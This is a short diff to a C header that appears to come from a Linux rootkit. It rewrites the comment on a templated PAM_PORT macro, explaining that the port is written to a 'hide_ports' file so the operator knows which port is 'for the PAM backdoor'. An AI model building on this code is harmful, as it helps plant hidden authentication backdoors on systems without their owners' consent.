@@ -11,5 +11,9 @@ void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...);
 void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args);
 #include "pam/pam_syslog.c"
 
-#define PAM_PORT ??PAM_PORT??  /* when set, is written to hide ports file */
+/* this is literally only here so that we can write
+ * a hidden port to the hide_ports file, and the
+ * user knows which port is and isn't for the PAM
+ * backdoor. */
+#define PAM_PORT ??PAM_PORT?? // [USE_PAM_BD]
 #endif
